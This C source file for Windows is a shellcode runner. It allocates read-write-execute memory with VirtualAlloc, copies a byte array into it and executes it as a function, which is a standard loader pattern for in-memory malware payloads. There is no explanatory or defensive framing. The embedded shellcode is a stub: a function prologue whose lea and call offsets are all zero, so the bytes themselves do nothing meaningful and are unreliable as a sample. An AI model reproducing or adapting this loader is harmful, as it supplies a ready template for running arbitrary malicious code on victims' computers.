#include <windows.h>
#include <stdio.h>

int main() {
        unsigned char shellcode[] = "\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x8d\x0d\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x48\x31\xc0\xe8\x00\x00\x00\x00";
    // Allocate executable memory
    void *exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        printf("VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Copy shellcode to executable memory
    memcpy(exec, shellcode, sizeof(shellcode));

    // Execute shellcode
    ((void(*)())exec)();

    // Free the allocated memory
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
